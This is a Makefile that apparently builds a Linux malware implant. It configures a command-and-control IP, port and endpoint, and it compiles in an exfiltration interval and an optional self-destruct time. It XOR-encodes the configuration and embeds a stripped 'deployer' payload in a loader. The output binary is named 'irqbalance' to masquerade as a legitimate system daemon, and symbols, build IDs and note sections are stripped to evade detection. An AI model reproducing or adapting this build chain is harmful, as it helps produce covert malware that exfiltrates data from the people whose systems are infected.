CC_STATIC := $(shell command -v musl-gcc 2>/dev/null || echo gcc)
CC_LOADER := gcc

CFLAGS_COMMON = -O2 -s -Wall -Wno-discarded-qualifiers -fno-asynchronous-unwind-tables -fno-ident
CFLAGS_STATIC = -static $(CFLAGS_COMMON)
CFLAGS_LOADER = -nostdlib -nostartfiles -static -O2 -fno-stack-protector \
    -fno-asynchronous-unwind-tables -fno-ident -Wl,--build-id=none -Wl,--gc-sections

ifneq (,$(findstring musl-gcc,$(CC_STATIC)))
CFLAGS_STATIC += -I/usr/include -idirafter /usr/include -idirafter /usr/include/x86_64-linux-gnu
endif

C2_IP    ?= 127.0.0.1
C2_PORT  ?= 80
INTERVAL ?= 3600
DESTRUCT ?= 0
ENDPOINT ?= /l

DEPLOY_FLAGS = -DEXFIL_INTERVAL=$(INTERVAL)
ifneq ($(DESTRUCT),0)
DEPLOY_FLAGS += -DDESTRUCT_TIME=$(DESTRUCT)
endif

.PHONY: all clean cleanall config

all: config irqbalance

config: xor_config.h

xor_config.h: xor_config.py
	python3 xor_config.py $(C2_IP) $(C2_PORT) $(ENDPOINT)

deployer_core: deployer.c xor_config.h
	$(CC_STATIC) $(CFLAGS_STATIC) $(DEPLOY_FLAGS) -Wl,--build-id=none -o $@ $<

deployer_core_stripped: deployer_core
	cp deployer_core deployer_core_stripped
	strip --strip-all deployer_core_stripped
	-objcopy --remove-section=.comment \
				--remove-section=.note \
				--remove-section=.note.gnu.build-id \
				--remove-section=.note.ABI-tag \
				deployer_core_stripped 2>/dev/null || true

payload_embedded.h: deployer_core_stripped payload_embed.py
	python3 payload_embed.py deployer_core_stripped $@

irqbalance: loader.c payload_embedded.h
	$(CC_LOADER) $(CFLAGS_LOADER) -o $@ $<
	strip --strip-all $@
	-objcopy --remove-section=.comment \
				--remove-section=.note \
				--remove-section=.note.gnu.build-id \
				--remove-section=.note.ABI-tag \
				$@ 2>/dev/null || true
	rm -f deployer_core deployer_core_stripped

clean:
	rm -f irqbalance deployer_core deployer_core_stripped
	rm -f xor_config.h payload_embedded.h

cleanall: clean
	rm -f auth_token.key
